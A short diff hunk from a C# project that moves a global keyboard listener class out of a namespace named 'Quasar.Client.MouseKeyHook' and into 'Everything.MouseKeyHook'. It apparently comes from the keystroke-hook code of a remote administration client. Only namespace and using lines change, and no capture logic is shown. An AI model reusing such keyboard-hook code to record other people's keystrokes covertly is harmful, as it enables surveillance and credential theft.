@@ -3,9 +3,10 @@
 // See license.txt or https://mit-license.org/
 
 using System.Collections.Generic;
-using Quasar.Client.MouseKeyHook.WinApi;
+using Everything.MouseKeyHook;
+using Everything.MouseKeyHook.WinApi;
 
-namespace Quasar.Client.MouseKeyHook.Implementation
+namespace Everything.MouseKeyHook.Implementation
 {
     internal class GlobalKeyListener : KeyListener
     {
